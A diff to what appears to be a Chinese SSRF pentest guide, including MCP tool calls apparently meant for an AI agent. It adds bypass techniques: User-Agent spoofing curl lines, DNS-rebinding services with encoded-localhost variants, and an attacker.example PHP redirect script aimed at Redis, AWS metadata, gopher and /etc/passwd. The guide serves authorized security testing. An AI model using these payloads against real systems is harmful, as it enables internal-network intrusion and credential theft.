@@ -369,6 +369,19 @@ Host 注入 → 密码重置中毒            = 8.1
 
 ---
 
+## 相关 MCP 工具
+
+实战中可调用 jshookmcp 完成自动化。**默认 `search` profile 未预加载工具,调用前先用 `mcp__jshook__activate_tools <工具名>` 激活**(详见 [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md) §推荐 profile)。
+
+| 工具 | 域 | 调用时机 |
+|---|---|---|
+| `mcp__jshook__network_intercept` + `mcp__jshook__network_get_requests` | network | 拦截外发请求 / 观察 SSRF 是否实际发出 |
+| `mcp__jshook__http2_probe` + `mcp__jshook__http_request_build` | network | HTTP/2 帧构造探测内网 / 绕过过滤 |
+| `mcp__jshook__network_replay_request` | network | 重放并修改 host / scheme / port 验证不同协议 |
+| `mcp__jshook__proto_infer_state_machine` | protocol-analysis | 自定义协议 SSRF 状态机推断 |
+
+完整映射:[`../tools/mcp-jshook.md`](../tools/mcp-jshook.md)
+
 ## 8. 不要做的事
 
 - **禁**：实际拿 IAM 临时凭据后调用 AWS API（`aws s3 ls` 也算）。仅证明可达 metadata 端点。
@@ -1977,5 +1990,109 @@ curl -6 "http://[IPv6_ADDRESS]/" -H "Host: target.com"
 curl -H "CF-Connecting-IP: 1.2.3.4" "http://REAL_IP/" -H "Host: target.com"
 curl -H "X-Forwarded-For: CDN_IP" "http://REAL_IP/" -H "Host: target.com"
 ```
+
+### SSRF 通用绕过三件套 — UA 头 / DNS 重绑定 / 302 重定向
+
+服务端做了 URL 白名单 / IP 校验 / 私网段过滤,但**校验时拉到的内容与实际请求时拉到的不是同一份**。以下三种绕过技术分别打"User-Agent 分支"、"DNS 解析时间窗"、"重定向跟随"。
+
+#### 1. UA 头分支绕过(常见于头像 / 图片下载接口)
+
+后端按 `User-Agent` 分流,内部代理 / 业务客户端走"无校验"分支,普通浏览器 UA 走"严格校验"分支。
+
+```php
+<?php
+$_user_agent = $_SERVER['HTTP_USER_AGENT'];
+if (strpos($_user_agent, 'go-httpclient') !== false) {
+    // 业务内部走客户端,直接跳到内部域不校验
+    header("Location: http://internal.test.qq.com/flag.html");
+} else {
+    // 普通用户走安全外链
+    header("Location: https://example.com/public.png");
+}
+?>
+```
+
+```text
+# 绕过:把 UA 改成业务客户端
+curl -A "go-httpclient/1.0" "https://target.com/fetch?url=https://attacker.example/img"
+curl -A "Java/1.8.0_271" ...
+curl -A "okhttp/4.9.0" ...
+curl -A "python-requests/2.28" ...
+curl -A "PostmanRuntime/7.30" ...
+
+# 看响应是否包含内部域内容(304 / Location: 内网 / 内容长度异常)即可判断分支命中
+```
+
+**典型触发点**:头像上传(URL 模式)、富文本"插入网络图片"、Webhook 配置、邮件附件预览、URL 链接预览。
+
+#### 2. DNS 重绑定(TOCTOU)
+
+服务端先解析 DNS 做白名单校验,然后再次解析发起请求。**两次解析之间 DNS 记录被切换** → 校验时是公网 IP、请求时是内网 IP。
+
+```text
+# 在线 rebinder(测试环境;实战自架避免与他人冲突)
+https://lock.cmpxchg8b.com/rebinder.html?1   # 1.1.1.1 ↔ 127.0.0.1 交替
+https://lock.cmpxchg8b.com/rebinder.html?2   # 自定义 IP
+
+# 关键参数
+- 设置极短 TTL(0 或 1)避免后端缓存解析
+- 使用 round-robin 把 [公网 IP, 127.0.0.1] 两条 A 记录交替返回
+- 127.0.0.1 的变种(校验逻辑只 blacklist 字面 127.0.0.1 时):
+    127.1
+    127.0.1
+    0.0.0.0
+    0
+    0x7f000001
+    2130706433        # decimal
+    017700000001      # octal
+    [::1]
+    [::ffff:7f00:1]
+    localtest.me      # 解析到 127.0.0.1 的公网域名
+    spoofed.burpcollaborator.net
+
+# 自建工具:singularity / dns-rebind / rbndr
+```
+
+**何时用**:
+- 后端代码出现 `parse_url + gethostbyname + 白名单 + curl_exec` 两段式
+- WAF 只看请求 URL 的字面 host,不看实际连接到的 IP
+- AWS metadata(169.254.169.254)被字面 blacklist 时
+
+#### 3. 302 重定向跟随绕过
+
+服务端只对**用户提交的 URL**做校验,但 `curl --location` / `requests follow_redirects=True` 会跟随 302 跳到任意 URL。在攻击者域上挂 `header("Location: http://internal/")` 即可。
+
+```php
+<?php
+// 攻击者控制的服务 — attacker.example/redir.php
+header("Location: http://127.0.0.1:6379/");   // Redis
+// header("Location: http://169.254.169.254/latest/meta-data/");  // AWS metadata
+// header("Location: gopher://127.0.0.1:6379/_...");  // gopher 内网横向
+// header("Location: file:///etc/passwd");  // file:// 本地读
+exit;
+```
+
+```text
+# 触发:在 SSRF 输入框填 attacker 域,后端校验通过(指向公网)→ 跟随重定向到内网
+POST /fetch HTTP/1.1
+url=https://attacker.example/redir.php
+
+# 链式重定向规避协议限制:
+# 后端只允许 https → attacker.example/redir1 (https)
+#                → attacker.example/redir2 (http)  ← 协议切换
+#                → http://127.0.0.1:6379/  ← 最终落点
+```
+
+**变种**:
+- HTTP `Refresh:` 头(部分 HTTP 客户端跟随)
+- HTML `<meta http-equiv="refresh">`(headless 渲染场景)
+- 30x 链多跳,中间穿插不同协议(http → https → http → gopher / dict / file)
+
+**真实命中要点(三件套合体)**:
+1. 用 **UA 头**找有内部分支的接口(看响应特征)
+2. 用 **DNS 重绑定**绕过字面 IP 黑名单
+3. 用 **302 重定向**绕过协议白名单 + 触发 gopher / file 落点
+
+OOB 验证用厂商提供的 SSRF 测试平台或自架 interactsh,不要用公共 DNSLog。
 
 ---
